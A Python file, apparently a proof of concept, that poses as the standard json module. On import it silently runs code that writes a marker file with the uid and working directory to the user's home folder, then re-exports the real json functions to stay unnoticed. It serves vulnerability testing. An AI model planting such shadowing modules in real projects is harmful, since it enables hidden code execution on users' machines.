import sys
import os
import builtins

def verify_shadowing_success():
    original_path = sys.path.copy()
    original_modules = sys.modules.copy()
    
    if '' in sys.path: sys.path.remove('')
    if '.' in sys.path: sys.path.remove('.')
    if os.getcwd() in sys.path: sys.path.remove(os.getcwd())
    if 'json' in sys.modules: del sys.modules['json']
        
    try:
        real_json = builtins.__import__('json')
        home_directory = os.path.expanduser("~")
        target_log_path = os.path.join(home_directory, "shadowing_test_result.json")

        log_data = {
            "vulnerability_present": True,
            "executed_by_uid": os.getuid() if hasattr(os, 'getuid') else "Windows",
            "current_working_directory": os.getcwd(),
            "mechanism": "Automated Background Interpretation"
        }
        
        try:
            with open(target_log_path, "w") as f:
                real_json.dump(log_data, f, indent=4)
        except IOError as e:
            fallback_data = {"vulnerability_present": True, "home_directory_write_allowed": False, "error_message": str(e)}
            with open("shadowing_failed_boundary.json", "w") as f:
                real_json.dump(fallback_data, f, indent=4)
                
    finally:
        sys.path = original_path
        sys.modules.update(original_modules)

verify_shadowing_success()

# Re-fetch standard attributes to avoid crashing the background runner
original_path = sys.path.copy()
if '' in sys.path: sys.path.remove('')
if '.' in sys.path: sys.path.remove('.')
if os.getcwd() in sys.path: sys.path.remove(os.getcwd())
if 'json' in sys.modules: del sys.modules['json']
real_json = builtins.__import__('json')
sys.path = original_path

dumps = real_json.dumps
loads = real_json.loads
JSONEncoder = real_json.JSONEncoder
JSONDecoder = real_json.JSONDecoder
